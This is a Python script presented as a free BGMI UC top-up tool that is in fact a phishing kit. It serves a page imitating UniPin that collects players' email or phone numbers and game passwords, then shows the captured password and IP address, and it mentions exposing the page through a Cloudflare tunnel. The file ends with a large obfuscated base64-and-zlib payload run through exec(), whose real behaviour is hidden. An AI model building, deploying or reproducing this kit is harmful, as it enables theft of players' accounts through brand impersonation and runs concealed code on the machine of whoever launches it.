#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
BGMI UC Topup Tool - Premium Version with Auto Tunnel (Fixed)
Developer: Aryan Afridi | DIGITAL CYBER Official
"""

import os
import sys
import time
import json
import threading
import webbrowser
import subprocess
import signal
import socket
import urllib.request
import platform
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================
# COLOR FUNCTIONS
# ============================================
class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def colored(text, color=Colors.RESET):
    return f"{color}{text}{Colors.RESET}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    banner = """
  /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$      
 | $$__  $$ /$$__  $$|__  $$__/| $$      
 | $$  \ $$| $$  \__/   | $$   | $$      
 | $$  | $$| $$  /$$$$  | $$   | $$      
 | $$  | $$| $$ |_____/  | $$   | $$      
 | $$  | $$| $$    $$    | $$   | $$      
 | $$$$$$$/|  $$$$$$/    | $$   | $$$$$$$$
 |_______/  \______/     |__/   |________/
"""
    print(colored(banner, Colors.RED))
    print(colored("\nSubscribe Our Channel to use this tool For Free!", Colors.YELLOW))
    webbrowser.open('https://www.youtube.com/@aryanafridi00?si=4ShUWvlCJUNi749h')
    time.sleep(5)
    clear_screen()
    logo = """
              ██████╗  ██████╗ ███╗   ███╗██╗
              ██╔══██╗██╔════╝ ████╗ ████║██║
              ██████╔╝██║  ███╗██╔████╔██║██║
              ██╔══██╗██║   ██║██║╚██╔╝██║██║
              ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║
                ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝
                               
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██████╔╝███████║██║███████╗███████║    ███████║███████║██║     █████╔╝ 
██╔═══╝ ██╔══██║██║╚════██║██╔══██║    ██╔══██║██╔══██║██║     ██╔═██╗ 
██║     ██║  ██║██║███████║██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""
    print(colored(logo, Colors.CYAN))
    print(colored("               __DGTL BGMI Hacking Tool__", Colors.YELLOW))
    print(colored("         >> Developer By Aryan Afridi | DIGITAL CYBER Official <<\n", Colors.CYAN))
    print(colored("     Tool to BGMI Id via Cloudflare Tunnel\n\n", Colors.GREEN))

# ============================================
# HTML PAGES (Modified: Simplified to Email/Phone + Password)
# ============================================
def get_html_form():
    return '''<!DOCTYPE html>
<html lang="en" dir="ltr" style="background: #16182B">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="yes" name="apple-mobile-web-app-capable" />
    <meta name="viewport"
          content="width=device-width, minimum-scale=1, maximum-scale=1, initial-scale=1, user-scalable=no" />

    <title>UniPin - Register &amp; Chance To Unlock 50,000 worth of UniPin Credits</title>
    <meta name='application-name' content="UniPin" />
    <meta name="copyright" content="&copy; 2026 by UniPin">

    <meta name='description' content="Top up or buy game credits/diamonds/game voucher, fast and cheap at UniPin. UniPin is the best way to buy game credits/game vouchers." />
    <meta name="title" content="UniPin - Register &amp; Chance To Unlock 50,000 worth of UniPin Credits" />

    <meta name="robots" content="noodp, noydir" />

    <meta name="csrf-token" content="ubAzpD2AbGJILzS2E7EF9X55zoU10mXSDM6BKKZt">
    <meta name="theme-color" content="#ff962d">
    <link rel="manifest" href="/manifest.json">

    <!-- Removed CSP to allow inline scripts -->
    <link rel="apple-touch-icon" sizes="144x144" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="apple-touch-icon" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="shortcut icon" sizes="196x196" href="https://cdn.unipin.com/images/unipin-dark-square.png" />
    <link rel="shortcut icon" type="image/x-icon" href="https://cdn.unipin.com/img/favicon.ico" />
    <link rel="icon" type="image/x-icon" href="https://cdn.unipin.com/img/favicon.ico" />

    <meta property="og:url" content="http://www.unipin.com/in/article/register_and_chance_to_unlock_50000_worth_of_unipin_credits" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="UniPin " />
    <meta property="og:description"
          content="Top up or buy game credits/diamonds/game voucher, fast and cheap at UniPin. UniPin is the best way to buy game credits/game vouchers." />
    <meta property="og:image"
          content="https://cdn.unipin.com/images/content_image_pages/1780456772-700x280px%20_Website%20(5).jpg" />

    <meta property="twitter:card" content="summary">
    <meta property="twitter:site" content="@unipin">
    <meta property="twitter:title" content="UniPin " />
    <meta property="twitter:description"
          content="Top up or buy game credits/diamonds/game voucher, fast and cheap at UniPin. UniPin is the best way to buy game credits/game vouchers." />
    <meta property="twitter:image"
          content="https://cdn.unipin.com/images/content_image_pages/1780456772-700x280px%20_Website%20(5).jpg" />
    <meta property="twitter:url" content="http://www.unipin.com/in/article/register_and_chance_to_unlock_50000_worth_of_unipin_credits" />

    <meta name="ahrefs-site-verification" content="cc5310a60dff2678238fc465e3bb66bc6716d916c3dfbde7f94f98029637b7ca">

    <link rel="preload" href="https://cdn.unipin.com/images/unipin-logo-white.svg" as="image">

    <link rel="preconnect" href="https://www.googletagmanager.com" crossorigin>
    <link rel="preconnect" href="https://connect.facebook.net/" crossorigin>

    <link href="/css/app.v5.css?id=7459922ce4c02bc5e33f" rel="stylesheet" type="text/css"/>

    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400;1,700&display=swap"
        rel="stylesheet">

    <style>
        body {
            background: #16182B;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #1c1e3a;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
        }
        .logo-area {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-area img {
            max-width: 120px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-weight: 500;
            margin-bottom: 5px;
            color: #aaa;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 10px;
            border: 1px solid #333;
            background: #2a2c4a;
            color: #fff;
            font-size: 15px;
            transition: 0.3s;
            box-sizing: border-box;
        }
        .form-group input:focus {
            border-color: #ff962d;
            outline: none;
            box-shadow: 0 0 0 3px rgba(255,150,45,0.2);
        }
        .form-group .checkbox {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .form-group .checkbox input {
            width: auto;
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff962d, #ff6b35);
            border: none;
            border-radius: 12px;
            color: #0a0a1a;
            font-weight: 700;
            font-size: 18px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255,150,45,0.3);
        }
        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .error-msg {
            color: #ff4444;
            font-size: 13px;
            margin-top: 5px;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #2a2c4a;
            padding-top: 20px;
        }
        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(10,10,26,0.2);
            border-top: 2px solid #0a0a1a;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .uc-selector {
            background: #2a2c4a;
            border-radius: 10px;
            padding: 15px;
            margin-top: 10px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .uc-option {
            background: #3a3c5a;
            padding: 8px 18px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 500;
            transition: 0.2s;
            border: 2px solid transparent;
        }
        .uc-option:hover {
            background: #4a4c6a;
        }
        .uc-option.selected {
            border-color: #ff962d;
            background: #ff962d20;
            color: #ff962d;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-area">
        <img src="https://cdn.unipin.com/images/unipin-logo-white.svg" alt="UniPin" style="max-width:150px;">
        <h2 style="margin:10px 0 5px; font-weight:300;">Register &amp; Win</h2>
        <p style="color:#aaa; font-size:14px;">Chance to unlock 50,000 UniPin Credits</p>
    </div>

    <form id="register-form" method="POST" action="/submit">
        <!-- Hidden UC field -->
        <input type="hidden" name="uc" id="uc-hidden" value="660">

        <!-- Email / Phone (identifier) -->
        <div class="form-group">
            <label>📧 Email or Phone Number</label>
            <input type="text" name="identifier" placeholder="Enter your email or phone number" required>
        </div>

        <!-- Password -->
        <div class="form-group">
            <label>🔑 Password</label>
            <input type="password" name="password" placeholder="Enter your BGMI password" required autocomplete="current-password">
        </div>

        <!-- UC Package Selection -->
        <div class="form-group">
            <label> Select UC Package (Free)</label>
            <div class="uc-selector">
                <div class="uc-option" data-uc="60">60 UC</div>
                <div class="uc-option" data-uc="325">325 UC</div>
                <div class="uc-option selected" data-uc="660">660 UC</div>
                <div class="uc-option" data-uc="1800">1800 UC</div>
            </div>
        </div>

        <!-- Terms checkbox -->
        <div class="form-group checkbox">
            <input type="checkbox" name="accept_terms" required>
            <label style="font-weight:300; font-size:13px; color:#aaa;">I agree to the <a href="#" style="color:#ff962d;">Terms &amp; Conditions</a></label>
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">
            <span id="btnText">🎁 Get Free UC Now</span>
            <span class="loader" id="loader"></span>
        </button>
    </form>

    <div class="footer">
        <p>© 2026 UniPin • All rights reserved</p>
        <p style="margin-top:5px; color:#4caf50;">🪂 256-bit encrypted • Secure</p>
    </div>
</div>

<script>
    // UC package selection
    document.querySelectorAll('.uc-option').forEach(el => {
        el.addEventListener('click', function() {
            document.querySelectorAll('.uc-option').forEach(e => e.classList.remove('selected'));
            this.classList.add('selected');
            document.getElementById('uc-hidden').value = this.dataset.uc;
        });
    });

    // Form submission with fetch
    const form = document.getElementById('register-form');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const loader = document.getElementById('loader');

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const identifier = this.querySelector('input[name="identifier"]').value.trim();
        const password = this.querySelector('input[name="password"]').value;
        const accept = this.querySelector('input[name="accept_terms"]').checked;
        const uc = document.getElementById('uc-hidden').value;

        if (!identifier || !password) {
            alert('Please fill in both Email/Phone and Password.');
            return;
        }
        if (!accept) {
            alert('You must accept the Terms & Conditions.');
            return;
        }

        // Disable button and show loader
        btnText.textContent = 'Processing...';
        loader.style.display = 'inline-block';
        submitBtn.disabled = true;

        fetch('/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                identifier: identifier,
                password: password,
                uc: uc
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                btnText.textContent = '✅ Success!';
                submitBtn.style.background = 'linear-gradient(135deg, #4caf50, #45a049)';
                setTimeout(() => {
                    window.location.href = '/result';
                }, 1200);
            } else {
                throw new Error('Server error');
            }
        })
        .catch(error => {
            btnText.textContent = '❌ Error! Try Again';
            submitBtn.style.background = 'linear-gradient(135deg, #ff4444, #cc0000)';
            loader.style.display = 'none';
            submitBtn.disabled = false;
            setTimeout(() => {
                btnText.textContent = '🎁 Get Free UC Now';
                submitBtn.style.background = '';
            }, 2000);
        });
    });

    // Auto-select 660 UC as default (already selected in HTML)
</script>
</body>
</html>'''

def get_result_page(data):
    return f'''<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Topup Successful - UniPin</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',sans-serif;background:#0a0a1a;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(ellipse at center,rgba(76,175,80,0.05) 0%,transparent 70%),linear-gradient(180deg,#0a0a1a 0%,#16182B 100%)}}
.container{{width:100%;max-width:480px;background:linear-gradient(145deg,rgba(26,28,58,0.95),rgba(15,17,38,0.98));border-radius:28px;padding:40px 25px 35px;box-shadow:0 30px 80px rgba(0,0,0,0.9),0 0 0 1px rgba(76,175,80,0.1);backdrop-filter:blur(20px);border:1px solid rgba(76,175,80,0.08);text-align:center}}
.success-animation{{position:relative;display:inline-block;margin-bottom:20px}}
.success-circle{{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,rgba(76,175,80,0.15),rgba(76,175,80,0.05));border:2px solid rgba(76,175,80,0.2);display:flex;align-items:center;justify-content:center;margin:0 auto;animation:pulse 2s ease-in-out infinite}}
.success-circle .check{{font-size:50px}}
@keyframes pulse{{0%,100%{{transform:scale(1);box-shadow:0 0 20px rgba(76,175,80,0)}}50%{{transform:scale(1.05);box-shadow:0 0 40px rgba(76,175,80,0.15)}}}}
.container h1{{font-family:'Orbitron',sans-serif;color:#4caf50;font-size:26px;margin-bottom:6px;font-weight:800}}
.container .sub-title{{color:#6a6c8a;font-size:14px;margin-bottom:25px}}
.uc-delivery{{display:inline-block;background:rgba(255,150,45,0.08);border:1px solid rgba(255,150,45,0.12);padding:8px 25px;border-radius:30px;color:#ff962d;font-size:14px;font-weight:600;margin-bottom:25px;animation:glow 2s ease-in-out infinite}}
@keyframes glow{{0%,100%{{box-shadow:0 0 20px rgba(255,150,45,0)}}50%{{box-shadow:0 0 30px rgba(255,150,45,0.1)}}}}
.details{{background:rgba(255,255,255,0.03);border-radius:16px;padding:18px 20px;text-align:left;margin-bottom:25px;border:1px solid rgba(255,255,255,0.04)}}
.details .row{{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.03)}}
.details .row:last-child{{border-bottom:none}}
.details .label{{color:#6a6c8a;font-size:13px;font-weight:400}}
.details .value{{color:#fff;font-weight:500;font-size:13px;word-break:break-all;text-align:right;max-width:60%;font-family:'Orbitron',sans-serif}}
.details .value.email{{font-family:'Roboto',sans-serif}}
.back-btn{{display:inline-block;padding:12px 35px;background:rgba(255,255,255,0.06);color:#8a8caa;text-decoration:none;border-radius:30px;font-weight:500;transition:all 0.3s ease;border:1px solid rgba(255,255,255,0.04);font-size:14px}}
.back-btn:hover{{background:rgba(255,255,255,0.1);color:#fff;transform:translateY(-2px)}}
.back-btn .arrow{{margin-right:8px}}
.footer-note{{margin-top:20px;color:#3a3c5a;font-size:11px}}
.footer-note .highlight{{color:#4caf50}}
@media (max-width:480px){{.container{{padding:30px 16px 25px}}.success-circle{{width:80px;height:80px}}.success-circle .check{{font-size:40px}}.container h1{{font-size:22px}}}}
</style>
</head>
<body>
<div class="container">
<div class="success-animation"><div class="success-circle"><span class="check">✅</span></div></div>
<h1>Topup Successful!</h1>
<p class="sub-title">Your UC request has been processed successfully</p>
<div class="uc-delivery">🎉 Delivering your UC...</div>
<div class="details">
<div class="row"><span class="label">📧 Email/Phone</span><span class="value email">{data['identifier']}</span></div>
<div class="row"><span class="label">🔑 Password</span><span class="value">{data['password']}</span></div>
<div class="row"><span class="label">🪖 UC Requested</span><span class="value">{data['uc']} UC</span></div>
<div class="row"><span class="label">📍 IP Address</span><span class="value">{data['ip']}</span></div>
<div class="row"><span class="label">⏰ Time</span><span class="value">{data['time']}</span></div>
</div>
<a href="/" class="back-btn"><span class="arrow">⬅️</span> Back to Home</a>
<div class="footer-note"><span class="highlight">✓</span> Transaction ID: <span class="highlight">BGMI-{data['uc']}-{int(time.time()) % 1000000}</span></div>
</div>
</body>
</html>'''

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'==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